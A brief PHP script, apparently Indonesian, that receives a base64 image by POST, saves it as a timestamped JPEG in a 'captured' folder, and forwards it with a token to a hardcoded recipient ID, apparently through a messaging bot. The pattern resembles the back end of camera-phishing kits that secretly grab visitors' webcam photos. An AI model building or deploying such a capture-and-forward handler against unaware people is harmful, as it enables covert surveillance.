<?php
    
    include 'global.php';

    $gambar = $_POST['gambar'];

    $timestamp = date_timestamp_get($date);
    $namapic = $timestamp.'.jpg';
    
    $filepic='../captured/'.$namapic;
    file_put_contents($filepic, base64_decode($gambar));

    sendImage($adnan_id, $filepic, $token);

?>